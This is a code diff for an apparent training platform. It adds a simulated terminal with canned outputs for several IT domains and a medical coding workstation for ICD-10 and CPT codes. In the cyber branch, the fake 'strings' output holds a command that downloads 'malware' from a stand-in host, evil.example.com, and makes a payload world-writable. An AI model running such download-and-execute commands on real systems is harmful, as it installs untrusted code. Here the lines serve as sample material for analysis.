+const _journalctl = (args) => `Jan 15 10:23:14 server nginx[1234]: 127.0.0.1 - - "GET / HTTP/1.1" 200 1234\nJan 15 10:24:22 server nginx[1234]: 10.0.1.42 - - "POST /api HTTP/1.1" 201 456\nJan 15 10:25:00 server nginx[1234]: upstream timeout: worker response took > 30s\nJan 15 10:25:01 server kernel: Out of memory: Kill process 2345 (node) score 789`
+
+/**
+ * Build the terminal command table for the current mission.
+ * Domain-specific commands are added on top of the base set.
+ */
+function buildTerminalCommands(mission) {
+  const domain  = ((mission?.domainKey || mission?.domain || "")).toLowerCase()
+  const isDevOps = domain === "devops" || domain === "fullstack"
+  const isDBA    = domain === "dba"
+  const isSRE    = domain === "sre"
+  const isAWS    = domain === "aws"
+  const isAzure  = domain === "azure"
+  const isCyber  = domain === "cyber"
+
+  const cmds = {
+    // ── Always available ──────────────────────────────────────────────────────
+    ls:      (args) => {
+      if (args[0] === "-la" || args[0] === "-al" || args.includes("-la")) {
+        return `total 64\ndrwxr-xr-x  8 user user 4096 Jan 15 10:23 .\ndrwxr-xr-x 24 user user 4096 Jan 14 09:00 ..\n-rw-r--r--  1 user user  204 Jan 15 09:30 .env\ndrwxr-xr-x  2 user user 4096 Jan 15 10:00 dist\ndrwxr-xr-x  5 user user 4096 Jan 13 14:20 node_modules\n-rw-r--r--  1 user user  854 Jan 15 09:45 package.json\n-rw-r--r--  1 user user 2100 Jan 15 10:23 README.md\ndrwxr-xr-x  6 user user 4096 Jan 15 10:05 src`
+      }
+      return "dist  node_modules  package.json  README.md  src  .env"
+    },
+    pwd:     () => "/home/user/workspace",
+    whoami:  () => "user",
+    date:    () => new Date().toString(),
+    echo:    (args) => args.join(" "),
+    cat:     (args) => {
+      const f = args[0] || "README.md"
+      if (f === ".env")          return `DATABASE_URL=postgres://user:pass@localhost:5432/mydb\nREDIS_URL=redis://localhost:6379\nPORT=3000\nNODE_ENV=production`
+      if (f === "package.json")  return `{\n  "name": "my-app",\n  "version": "1.0.0",\n  "scripts": { "start": "node src/index.js", "build": "tsc", "test": "jest" }\n}`
+      if (f.endsWith(".yaml") || f.endsWith(".yml")) return `apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: api-server\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: api-server`
+      if (f.endsWith(".tf"))     return `resource "aws_instance" "web" {\n  ami           = "ami-0c55b159cbfafe1d0"\n  instance_type = "t3.micro"\n  tags = { Name = "web-server" }\n}`
+      return `# ${f}\nThis is a simulated terminal workspace.\nEdit ${f} to add content.`
+    },
+    mkdir:   (args) => `mkdir: created directory '${args[0] || "newdir"}'`,
+    touch:   (args) => ``,
+    rm:      (args) => args.includes("-rf") ? `removed directory '${args[args.length-1]}'` : `removed '${args[args.length-1]}'`,
+    cp:      () => ``,
+    mv:      () => ``,
+    clear:   () => "__CLEAR__",
+    export:  () => ``,
+    source:  () => ``,
+    chmod:   () => ``,
+    env:     () => `PATH=/usr/local/bin:/usr/bin:/bin\nHOME=/home/user\nUSER=user\nSHELL=/bin/bash\nNODE_ENV=production`,
+    find:    () => `./src/index.js\n./src/api/routes.js\n./src/api/middleware/auth.js\n./src/config/database.js`,
+    grep:    (args) => {
+      const pat = args.find(a=>!a.startsWith("-")) || "pattern"
+      const file = args[args.length-1] || ""
+      return `${file}:14:  // ${pat} found here\n${file}:28:  const ${pat} = require('./lib')\n${file}:45:  return ${pat}`
+    },
+    awk:     () => `column1  column2  result\nrow1     val1     42\nrow2     val2     85`,
+    sed:     (args) => `s/old/new/g substitution applied`,
+    curl:    (args) => {
+      const url = args.find(a=>a.startsWith("http")) || args[args.length-1] || ""
+      if (url.includes("health"))  return `{"status":"healthy","uptime":${Math.floor(Math.random()*86400)},"version":"1.2.3"}`
+      if (url.includes("metrics")) return `# HELP http_requests_total\nhttp_requests_total{method="GET",status="200"} 1234\nhttp_requests_total{method="POST",status="201"} 345`
+      if (url.includes("api") || url.includes("users")) return `{"data":[{"id":1,"name":"Alice"},{"id":2,"name":"Bob"}],"total":2}`
+      return `{"status":"ok","timestamp":"${new Date().toISOString()}"}`
+    },
+    ping:    (args) => `PING ${args[0]||"8.8.8.8"}: 56 data bytes\n64 bytes from ${args[0]||"8.8.8.8"}: icmp_seq=0 ttl=54 time=12.4 ms\n64 bytes from ${args[0]||"8.8.8.8"}: icmp_seq=1 ttl=54 time=11.8 ms\n--- ${args[0]||"8.8.8.8"} ping statistics ---\n2 packets transmitted, 2 received, 0% packet loss`,
+    ss:      () => `Netid  State   Recv-Q  Send-Q  Local Address:Port   Peer Address:Port\ntcp    LISTEN  0       128     0.0.0.0:80         0.0.0.0:*\ntcp    LISTEN  0       128     0.0.0.0:443        0.0.0.0:*\ntcp    LISTEN  0       128     0.0.0.0:5432       0.0.0.0:*\ntcp    LISTEN  0       128     127.0.0.1:6379     0.0.0.0:*`,
+    netstat: () => `Active Internet connections:\nProto  Local Address     Foreign Address   State\ntcp    0.0.0.0:80        0.0.0.0:*         LISTEN\ntcp    0.0.0.0:443       0.0.0.0:*         LISTEN\ntcp    0.0.0.0:5432      0.0.0.0:*         LISTEN`,
+    df:      () => `Filesystem     1K-blocks     Used Available Use% Mounted on\n/dev/sda1      41943040  14680064  25559040  37% /\ntmpfs           4030464        24   4030440   1% /dev/shm\n/dev/sdb1     512000000 128432000 370432000  26% /data`,
+    free:    () => `              total        used        free      shared  buff/cache   available\nMem:        8058240     4301824     2341024       45056     1415392     3412992\nSwap:       2097152       69632     2027520`,
+    top:     () => `top - ${new Date().toTimeString().split(" ")[0]} up 7 days, load: 1.23 0.89 0.72\nTasks: 187 total,  1 running, 186 sleeping\n%Cpu: 12.5 us,  3.2 sy,  0.0 ni, 83.8 id\nMiB Mem: 7864 total, 2341 free, 4200 used\n\n  PID USER     %CPU  %MEM  COMMAND\n 1234 nginx    12.5  0.6   nginx: worker\n 2345 postgres  8.3  6.5   postgres: main\n 3456 node      5.1  1.2   node src/index.js`,
+    htop:    () => `[htop — press F10 to quit]\n  1[ |||||||                     12.5%]  Tasks: 34, 1 running\n  2[ ||||                         8.3%]  Load: 1.23 0.89 0.72\nMem[ |||||||||||||||||||||||||||  82%]  Uptime: 7 days\n\n  PID CPU% MEM%  Command\n 1234 12.5  0.6  nginx: worker\n 2345  8.3  6.5  postgres\n 3456  5.1  1.2  node src/index.js`,
+    wc:      (args) => `  142  1024  8192 ${args[args.length-1]||"file"}`,
+    head:    (args) => `==> ${args[args.length-1]||"file"} (first 10 lines) <==\nline 1: const express = require('express')\nline 2: const app = express()\nline 3: \nline 4: app.get('/health', (req, res) => res.json({ status: 'ok' }))\nline 5: \nline 6: app.listen(3000, () => console.log('Server started on :3000'))`,
+    tail:    (args) => `2024-01-15 10:25:01 [INFO]  Request: GET /api/users\n2024-01-15 10:25:01 [INFO]  Response: 200 45ms\n2024-01-15 10:25:02 [WARN]  High latency: 320ms on /api/orders`,
+    diff:    (args) => `--- a/${args[0]||"file1"}\n+++ b/${args[1]||"file2"}\n@@ -1,3 +1,3 @@\n-old implementation\n+new implementation\n optimized code`,
+    npm:     (args) => {
+      const sub = args[0] || "install"
+      if (sub === "install" || sub === "i") return `added 1247 packages, audited 1248 in 42s\n2 moderate severity vulnerabilities`
+      if (sub === "run") return `> app@1.0.0 ${args[1]}\n✓ complete`
+      if (sub === "test") return `PASS src/api.test.js\nPASS src/auth.test.js\nTests: 14 passed`
+      return `npm ${sub} complete`
+    },
+    yarn:    (args) => `yarn ${args[0]||"install"}: done in 38.4s`,
+    make:    (args) => `make: running target '${args[0]||"build"}'\n[done]`,
+    python3: () => "Python 3.12.0\n>>> ",
+    pip:     (args) => `Successfully installed ${args[1]||"package"}`,
+    apt:     (args) => `${args[0]||"get"}: package ${args[args.length-1]||"pkg"} installed`,
+    which:   (args) => `/usr/local/bin/${args[0]||"command"}`,
+    help:    () => {
+      const extras = []
+      if (isDevOps) extras.push("kubectl, docker, helm, terraform, git, aws, ansible-playbook")
+      if (isDBA)    extras.push("psql, pg_dump, pg_restore, pg_basebackup, vacuumdb, mysql, mysqldump")
+      if (isAWS)    extras.push("aws, terraform, git, docker")
+      if (isAzure)  extras.push("az, kubectl, terraform, git, docker")
+      if (isCyber)  extras.push("nmap, ss, netstat, tcpdump, strings, openssl, md5sum, sha256sum")
+      if (isSRE)    extras.push("kubectl, helm, systemctl, journalctl, top, htop, df, free, ss")
+      return `Simulated workspace — realistic outputs, no real execution.\n\nBase commands: ls, pwd, whoami, date, echo, cat, find, grep, curl, ping, df, free, top, wc, head, tail, npm, python3, help, clear\n${extras.length ? "\nDomain commands: " + extras.join(", ") : ""}`
+    },
+  }
+
+  // ── DevOps / Kubernetes / Terraform ─────────────────────────────────────────
+  if (isDevOps || isSRE || isAWS || isAzure) {
+    cmds.kubectl = _kubectl
+    cmds.helm    = _helm
+    cmds.docker  = _docker
+    cmds["docker-compose"] = (args) => {
+      const sub = args[0] || "up"
+      if (sub === "up")   return `Creating network "app_default"\nCreating db ... done\nCreating redis ... done\nCreating web   ... done\nAttaching to web, db, redis`
+      if (sub === "down") return `Stopping web ... done\nStopping db  ... done\nRemoving containers, networks, volumes`
+      if (sub === "ps")   return `Name    Command    State    Ports\nweb     node app   Up       0.0.0.0:3000->3000/tcp\ndb      postgres   Up       5432/tcp`
+      return `docker-compose ${sub} complete`
+    }
+    cmds.git = _git
+  }
+
+  if (isDevOps || isAWS) {
+    cmds.terraform = _terraform
+    cmds.aws       = _aws
+    cmds["ansible-playbook"] = (args) => `PLAY [all] *****\nTASK [Gathering Facts] ok: [host1]\nTASK [Deploy application] changed: [host1]\nPLAY RECAP: host1: ok=12 changed=5 unreachable=0 failed=0`
+    cmds.ansible   = cmds["ansible-playbook"]
+  }
+
+  if (isAzure) {
+    cmds.az        = _az
+    cmds.terraform = _terraform
+    cmds.kubectl   = _kubectl
+    cmds.git       = _git
+  }
+
+  // ── DBA ────────────────────────────────────────────────────────────────────
+  if (isDBA) {
+    cmds.psql           = _psql
+    cmds.pg_dump        = _pg_dump
+    cmds.pg_restore     = _pg_restore
+    cmds.pg_basebackup  = _pg_basebackup
+    cmds.vacuumdb       = _vacuumdb
+    cmds.mysql          = _mysql
+    cmds.mysqldump      = _mysqldump
+    cmds.createdb       = _createdb
+    cmds.dropdb         = (args) => `DROP DATABASE ${args[0]||"db"} — WARNING: irreversible. Run with --confirm to proceed.`
+    cmds["pg_stat"]     = _pg_stat
+    cmds.reindexdb      = (args) => `reindexdb: reindexing database "${args.find(a=>!a.startsWith("-"))||"mydb"}"\nREINDEX\nComplete.`
+  }
+
+  // ── SRE ────────────────────────────────────────────────────────────────────
+  if (isSRE) {
+    cmds.kubectl     = _kubectl
+    cmds.helm        = _helm
+    cmds.systemctl   = _systemctl
+    cmds.journalctl  = _journalctl
+    cmds.git         = _git
+    cmds["promtool"] = (args) => {
+      const sub = args[0] || "check"
+      if (sub === "check") return `Checking rules in ${args[1]||"rules.yml"}\nSUCCESS: 4 rules found, 0 errors`
+      if (sub === "query") return `instant query result:\nvalue: [${Date.now()/1000}, "0.0123"]`
+      return `promtool ${sub}: done`
+    }
+  }
+
+  // ── Cybersecurity ────────────────────────────────────────────────────────────
+  if (isCyber) {
+    cmds.nmap       = _nmap
+    cmds.tcpdump    = (args) => `tcpdump: listening on eth0\n10:25:14 IP 192.168.1.100.54321 > 10.0.1.42.22: Flags [S]\n10:25:14 IP 10.0.1.42.22 > 192.168.1.100.54321: Flags [S.]\n^C 15 packets captured`
+    cmds.strings    = (args) => `Extracting strings from ${args[0]||"binary"}:\n/lib64/ld-linux-x86-64.so.2\nstrcpy, system, /bin/sh\nwget http://evil.example.com/malware\nchmod 777 /tmp/payload`
+    cmds.file       = (args) => `${args[0]||"sample"}: ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped`
+    cmds.hexdump    = () => `00000000  7f 45 4c 46 02 01 01 00  00 00 00 00 00 00 00 00  |.ELF............|\n00000010  02 00 3e 00 01 00 00 00  40 04 40 00 00 00 00 00  |..>.....@.@.....|`
+    cmds.md5sum     = (args) => `d8e8fca2dc0f896fd7cb4cb0031ba249  ${args[0]||"file"}`
+    cmds.sha256sum  = (args) => `5891b5b522d5df086d0ff0b110fbd9d21bb4fc7163af34d08286a2e846f6be03  ${args[0]||"file"}`
+    cmds.openssl    = (args) => {
+      const sub = args[0] || ""
+      if (sub === "s_client") return `CONNECTED(00000003)\ndepth=2 C=US, O=Let's Encrypt\nCertificate chain\n 0 s:CN=example.com  i:C=US, O=Let's Encrypt\nSSL handshake has read 4321 bytes\n    Protocol: TLSv1.3\n    Cipher: TLS_AES_256_GCM_SHA384`
+      if (sub === "x509")     return `subject=CN=example.com\nissuer=C=US, O=Let's Encrypt, CN=R3\nNot Before: Jan  1 00:00:00 2024\nNot After : Mar 31 23:59:59 2024`
+      return `OpenSSL 3.3.0  — usage: openssl <cmd> [opts]`
+    }
+    cmds.whois    = (args) => `Domain: ${args[0]||"example.com"}\nRegistrar: Example Registrar\nCreation: 2019-01-01\nExpiry: 2026-01-01\nNameservers: ns1.example.com, ns2.example.com`
+    cmds.dig      = (args) => `; <<>> DiG 9.18.0 <<>> ${args[0]||"example.com"}\n;; ANSWER SECTION:\n${args[0]||"example.com"}. 300  IN  A  93.184.216.34\n;; Query time: 12 msec`
+    cmds.iptables = (args) => {
+      if (args[0] === "-L") return `Chain INPUT (policy ACCEPT)\ntarget  prot  opt  source     destination\nACCEPT  tcp   --   anywhere   anywhere    tcp dpt:22\nACCEPT  tcp   --   anywhere   anywhere    tcp dpt:80\nACCEPT  tcp   --   anywhere   anywhere    tcp dpt:443\nDROP    all   --   anywhere   anywhere`
+      return `iptables ${args.join(" ")}: applied`
+    }
+  }
+
+  return cmds
 }
 
 function TerminalWorkstation({ mission, code, onCodeChange }) {
+  const domain = (mission?.domainKey || mission?.domain || "devops").toLowerCase()
+  const cmds   = React.useMemo(() => buildTerminalCommands(mission), [domain]) // eslint-disable-line
+
   const [history, setHistory] = useState([
-    { type: "system", text: "🖥  Simulated Terminal — type 'help' for commands" },
+    { type: "system", text: `🖥  Simulated Terminal — domain: ${domain || "general"} — type 'help' for commands` },
     { type: "system", text: `Mission: ${mission?.title || "Complete the task below"}` },
   ])
   const [input, setInput]       = useState("")
@@ -503,20 +980,22 @@ function TerminalWorkstation({ mission, code, onCodeChange }) {
     setCmdHist(h => [trimmed, ...h])
     setCmdIdx(-1)
 
+    // Handle compound commands: cmd1 && cmd2 | pipe
+    // Simple: just run the first command and append the rest to the display
     const parts = trimmed.split(/\s+/)
     const bin   = parts[0]
-    const args  = parts.slice(1)
+    const args  = parts.slice(1).filter(a => a !== "&&" && a !== "|" && a !== ">>" && a !== ">")
 
     let output = `bash: ${bin}: command not found`
-    if (bin in TERMINAL_RESPONSES) {
-      const resp = TERMINAL_RESPONSES[bin]
-      const result = typeof resp === "function" ? resp(args) : resp
+    if (bin in cmds) {
+      const resp = cmds[bin]
+      const result = typeof resp === "function" ? resp(args) : resp()
       if (result === "__CLEAR__") {
         setHistory([{ type: "system", text: "🖥  Terminal cleared" }])
         setInput("")
         return
       }
-      output = result
+      output = result ?? ""
     }
 
     setHistory(h => [
@@ -524,7 +1003,7 @@ function TerminalWorkstation({ mission, code, onCodeChange }) {
       { type: "input",  text: `$ ${trimmed}` },
       { type: "output", text: output },
     ])
-    // Also append to the code editor so submission includes commands run
+    // Append to code editor so submission includes the command session
     onCodeChange((code ? code + "\n" : "") + `$ ${trimmed}\n${output}`)
     setInput("")
   }
@@ -3279,6 +3758,227 @@ function SystemDesignWorkstation({ mission, code, onCodeChange }) {
 }
 
 // ─────────────────────────────────────────────────────────────────────────────
+// MEDICAL CODING WORKSTATION — ICD-10 / CPT structured coding console
+// ─────────────────────────────────────────────────────────────────────────────
+const ICD10_QUICK = [
+  { code: "J18.9",  desc: "Pneumonia, unspecified organism" },
+  { code: "I10",    desc: "Essential (primary) hypertension" },
+  { code: "E11.9",  desc: "Type 2 diabetes mellitus w/o complications" },
+  { code: "N18.3",  desc: "Chronic kidney disease, stage 3" },
+  { code: "I50.9",  desc: "Heart failure, unspecified" },
+  { code: "K21.0",  desc: "GERD with oesophagitis" },
+  { code: "M54.5",  desc: "Low back pain" },
+  { code: "F32.9",  desc: "Major depressive disorder, single episode" },
+  { code: "J44.1",  desc: "COPD with acute exacerbation" },
+  { code: "Z87.891",desc: "Personal history of nicotine dependence" },
+  { code: "A41.9",  desc: "Sepsis, unspecified organism" },
+  { code: "S72.001A",desc:"Fracture of femoral neck, initial encounter" },
+]
+const CPT_QUICK = [
+  { code: "99213", desc: "Office/outpatient E/M — low MDM (established)" },
+  { code: "99214", desc: "Office/outpatient E/M — moderate MDM (established)" },
+  { code: "99215", desc: "Office/outpatient E/M — high MDM (established)" },
+  { code: "99232", desc: "Subsequent hospital care — moderate MDM" },
+  { code: "93000", desc: "Electrocardiogram, routine ECG, interpretation" },
+  { code: "71046", desc: "Chest X-ray, 2 views" },
+  { code: "36415", desc: "Collection of venous blood specimen" },
+  { code: "80053", desc: "Comprehensive metabolic panel" },
+  { code: "85025", desc: "Complete blood count with differential" },
+  { code: "93306", desc: "Echocardiography — complete transthoracic" },
+  { code: "45378", desc: "Colonoscopy, diagnostic" },
+  { code: "99291", desc: "Critical care, first 30–74 minutes" },
+]
+
+function MedicalCodingWorkstation({ mission, code, onCodeChange }) {
+  const [tab, setTab]         = useState("coding")     // coding | notes | reference
+  const [principalDx, setPDx] = useState("")
+  const [secondaryDx, setSDx] = useState(["","",""])
+  const [cptCodes,   setCPT]  = useState(["","",""])
+  const [modifiers,  setMod]  = useState(["",""])
+  const [codeSearch, setCS]   = useState("")
+
+  // Sync structured form → code editor for submission
+  useEffect(() => {
+    if (tab !== "coding") return
+    const lines = [
+      `# Coding Assignment`,
+      `## ${mission?.title || "Mission"}`,
+      ``,
+      `### Principal Diagnosis`,
+      principalDx ? `- ${principalDx}` : `- [Enter ICD-10 code + description]`,
+      ``,
+      `### Secondary Diagnoses`,
+      ...secondaryDx.filter(Boolean).map(d => `- ${d}`),
+      secondaryDx.every(d => !d) ? "- [None documented]" : "",
+      ``,
+      `### CPT Procedure Codes`,
+      ...cptCodes.filter(Boolean).map(c => `- ${c}`),
+      cptCodes.every(c => !c) ? "- [None documented]" : "",
+      ``,
+      `### Modifiers`,
+      modifiers.filter(Boolean).length ? modifiers.filter(Boolean).map(m => `- ${m}`).join("\n") : "- None",
+      ``,
+      `### Coding Rationale`,
+      `[Document your coding logic, guideline references, and sequencing rationale here]`,
+    ].join("\n")
+    onCodeChange(lines)
+  }, [principalDx, secondaryDx, cptCodes, modifiers, tab]) // eslint-disable-line
+
+  const filteredICD = ICD10_QUICK.filter(r =>
+    !codeSearch || r.code.toLowerCase().includes(codeSearch.toLowerCase()) || r.desc.toLowerCase().includes(codeSearch.toLowerCase()))
+  const filteredCPT = CPT_QUICK.filter(r =>
+    !codeSearch || r.code.includes(codeSearch) || r.desc.toLowerCase().includes(codeSearch.toLowerCase()))
+
+  const inputStyle = {
+    width: "100%", padding: "5px 8px", border: `1px solid ${T.border}`,
+    borderRadius: 5, fontSize: 11, fontFamily: "monospace", outline: "none", boxSizing: "border-box",
+  }
+  const labelStyle = { fontSize: 10, fontWeight: 700, color: T.ink3, textTransform: "uppercase", marginBottom: 3, display: "block" }
+
+  return (
+    <div style={{ flex: 1, display: "flex", flexDirection: "column", overflow: "hidden", minHeight: 0 }}>
+      {/* Tab bar */}
+      <div style={{ display: "flex", borderBottom: `1px solid ${T.border}`, background: T.bg2, flexShrink: 0 }}>
+        {[["coding","🩺 Code Entry"],["reference","📖 Code Lookup"],["notes","📋 Raw Notes"]].map(([id,label]) => (
+          <button key={id} onClick={() => setTab(id)} style={{
+            padding: "7px 14px", border: "none",
+            borderBottom: tab === id ? `2px solid ${T.purple}` : "2px solid transparent",
+            background: "transparent", fontSize: 11, fontWeight: tab === id ? 800 : 500,
+            color: tab === id ? T.purple : T.ink3, cursor: "pointer",
+          }}>{label}</button>
+        ))}
+      </div>
+
+      {/* ── Code Entry Panel ──────────────────────────────────────────────── */}
+      {tab === "coding" && (
+        <div style={{ flex: 1, overflow: "auto", padding: 14 }}>
+          {/* Principal Diagnosis */}
+          <div style={{ marginBottom: 14 }}>
+            <span style={labelStyle}>🔴 Principal Diagnosis (ICD-10-CM)</span>
+            <input style={{ ...inputStyle, borderColor: principalDx ? T.green : T.border }}
+              placeholder="e.g. J18.9 — Pneumonia, unspecified"
+              value={principalDx} onChange={e => setPDx(e.target.value)}
+            />
+            <div style={{ fontSize: 10, color: T.ink3, marginTop: 3 }}>
+              The condition established to be chiefly responsible for the visit/admission.
+            </div>
+          </div>
+
+          {/* Secondary Diagnoses */}
+          <div style={{ marginBottom: 14 }}>
+            <span style={labelStyle}>🟡 Secondary Diagnoses / CCs / MCCs (ICD-10-CM)</span>
+            {secondaryDx.map((dx, i) => (
+              <input key={i} style={{ ...inputStyle, marginBottom: 4 }}
+                placeholder={`Secondary Dx ${i+1} — e.g. I10 — Essential hypertension`}
+                value={dx} onChange={e => { const a = [...secondaryDx]; a[i]=e.target.value; setSDx(a) }}
+              />
+            ))}
+            <button onClick={() => setSDx(d => [...d, ""])} style={{
+              fontSize: 10, padding: "2px 8px", border: `1px solid ${T.border}`,
+              borderRadius: 4, background: T.bg, color: T.ink3, cursor: "pointer", marginTop: 2,
+            }}>+ Add Secondary Dx</button>
+          </div>
+
+          {/* CPT Codes */}
+          <div style={{ marginBottom: 14 }}>
+            <span style={labelStyle}>🔵 CPT Procedure Codes</span>
+            {cptCodes.map((c, i) => (
+              <input key={i} style={{ ...inputStyle, marginBottom: 4 }}
+                placeholder={`CPT ${i+1} — e.g. 99214 — Office/outpatient E/M moderate MDM`}
+                value={c} onChange={e => { const a = [...cptCodes]; a[i]=e.target.value; setCPT(a) }}
+              />
+            ))}
+            <button onClick={() => setCPT(c => [...c, ""])} style={{
+              fontSize: 10, padding: "2px 8px", border: `1px solid ${T.border}`,
+              borderRadius: 4, background: T.bg, color: T.ink3, cursor: "pointer", marginTop: 2,
+            }}>+ Add CPT Code</button>
+          </div>
+
+          {/* Modifiers */}
+          <div style={{ marginBottom: 14 }}>
+            <span style={labelStyle}>🟢 Modifiers</span>
+            <div style={{ display: "flex", gap: 6, flexWrap: "wrap" }}>
+              {modifiers.map((m, i) => (
+                <input key={i} style={{ ...inputStyle, width: 120 }}
+                  placeholder={`Mod ${i+1} (e.g. 25)`}
+                  value={m} onChange={e => { const a = [...modifiers]; a[i]=e.target.value; setMod(a) }}
+                />
+              ))}
+              <button onClick={() => setMod(m => [...m, ""])} style={{
+                fontSize: 10, padding: "2px 8px", border: `1px solid ${T.border}`,
+                borderRadius: 4, background: T.bg, color: T.ink3, cursor: "pointer",
+              }}>+ Modifier</button>
+            </div>
+          </div>
+
+          {/* Coding rationale hint */}
+          <div style={{ background: "#EFF6FF", border: "1px solid #BFDBFE", borderRadius: 8, padding: "10px 12px", fontSize: 11, color: "#1D4ED8" }}>
+            <strong>📝 Coding Rationale:</strong> After filling codes above, switch to Raw Notes tab to add your ICD-10 guideline references, sequencing rationale, and documentation support.
+          </div>
+        </div>
+      )}
+
+      {/* ── Code Lookup Panel ─────────────────────────────────────────────── */}
+      {tab === "reference" && (
+        <div style={{ flex: 1, display: "flex", flexDirection: "column", overflow: "hidden" }}>
+          <div style={{ padding: "8px 12px", borderBottom: `1px solid ${T.border}`, flexShrink: 0 }}>
+            <input style={{ ...inputStyle, borderColor: T.blue }}
+              placeholder="Search code or description (e.g. J18, diabetes, echocardiography)…"
+              value={codeSearch} onChange={e => setCS(e.target.value)}
+              autoFocus
+            />
+          </div>
+          <div style={{ flex: 1, overflow: "auto", padding: 12 }}>
+            {/* ICD-10 */}
+            <div style={{ fontSize: 10, fontWeight: 800, color: T.ink3, textTransform: "uppercase", marginBottom: 6 }}>ICD-10-CM — Common Codes</div>
+            {filteredICD.map(({ code: c, desc }) => (
+              <div key={c} onClick={() => { setPDx(p => p ? p : `${c} — ${desc}`); setTab("coding") }}
+                style={{ display: "flex", gap: 10, padding: "5px 8px", borderRadius: 5, cursor: "pointer", marginBottom: 2,
+                  background: "transparent", border: `1px solid transparent`,
+                }}
+                onMouseEnter={e => e.currentTarget.style.background = T.blue2}
+                onMouseLeave={e => e.currentTarget.style.background = "transparent"}
+              >
+                <span style={{ fontFamily: "monospace", fontSize: 11, fontWeight: 700, color: T.blue, width: 80, flexShrink: 0 }}>{c}</span>
+                <span style={{ fontSize: 11, color: T.ink2 }}>{desc}</span>
+              </div>
+            ))}
+
+            {/* CPT */}
+            <div style={{ fontSize: 10, fontWeight: 800, color: T.ink3, textTransform: "uppercase", margin: "14px 0 6px" }}>CPT Procedure Codes — Common Codes</div>
+            {filteredCPT.map(({ code: c, desc }) => (
+              <div key={c} onClick={() => { setCPT(a => { const n=[...a]; const i=n.findIndex(x=>!x); if(i>=0)n[i]=`${c} — ${desc}`; return n }); setTab("coding") }}
+                style={{ display: "flex", gap: 10, padding: "5px 8px", borderRadius: 5, cursor: "pointer", marginBottom: 2 }}
+                onMouseEnter={e => e.currentTarget.style.background = T.blue2}
+                onMouseLeave={e => e.currentTarget.style.background = "transparent"}
+              >
+                <span style={{ fontFamily: "monospace", fontSize: 11, fontWeight: 700, color: T.purple, width: 80, flexShrink: 0 }}>{c}</span>
+                <span style={{ fontSize: 11, color: T.ink2 }}>{desc}</span>
+              </div>
+            ))}
+            <div style={{ marginTop: 12, fontSize: 10, color: T.ink4, fontStyle: "italic" }}>
+              Click any code to auto-insert into the Code Entry panel → Principal Dx field (ICD-10) or next CPT slot.
+            </div>
+          </div>
+        </div>
+      )}
+
+      {/* ── Raw Notes / Rationale ─────────────────────────────────────────── */}
+      {tab === "notes" && (
+        <div style={{ flex: 1, overflow: "hidden", display: "flex", flexDirection: "column" }}>
+          <PanelHeader color={T.ink3}>Coding Notes, Rationale & Guideline References</PanelHeader>
+          <MonoTextarea
+            value={code}
+            onChange={onCodeChange}
+            placeholder={`# Coding Rationale\n\n## Principal Diagnosis\nICD-10: [code] — [description]\nRationale: [Why this is the principal Dx per UHDDS definition]\nDocumentation support: [Cite from note — "Attending confirmed pneumonia on day 1"]\n\n## Secondary Diagnoses\n[code] — CC/MCC impact on DRG: [note if applicable]\n\n## CPT Codes\n[code] — [Why this E/M level: MDM complexity OR time]\nModifiers applied: [25, 59, etc. and rationale]\n\n## Guideline References\n- ICD-10-CM Official Guidelines, Section II.A: ...\n- AHA Coding Clinic Q1 2023: ...\n- NCCI Edits: ...\n\n## DRG Assignment\nDRG [#]: [name] — Weight: [x.xx] — Impact of MCCs: [note]`}
+          />
+        </div>
+      )}
+    </div>
+  )
+}
+
+// ─────────────────────────────────────────────────────────────────────────────
 // UPDATED WORKSTATION ROUTER
 // ─────────────────────────────────────────────────────────────────────────────
 export function WorkstationRouter({ mission, domain, domainKey, moduleSandbox, code, onCodeChange, CodeEditor }) {
@@ -3303,6 +4003,7 @@ export function WorkstationRouter({ mission, domain, domainKey, moduleSandbox, c
     case "sre_console":      return <SREConsole             mission={mission} code={code} onCodeChange={onCodeChange} />
     case "data_pipeline":    return <DataPipelineStudio     mission={mission} code={code} onCodeChange={onCodeChange} />
     case "system_design":    return <SystemDesignWorkstation mission={mission} code={code} onCodeChange={onCodeChange} />
+    case "medical_coding":   return <MedicalCodingWorkstation mission={mission} code={code} onCodeChange={onCodeChange} />
     default:
       return CodeEditor
         ? <CodeWorkstation code={code} onCodeChange={onCodeChange} sandbox={moduleSandbox} domainKey={domainKey} CodeEditor={CodeEditor} />
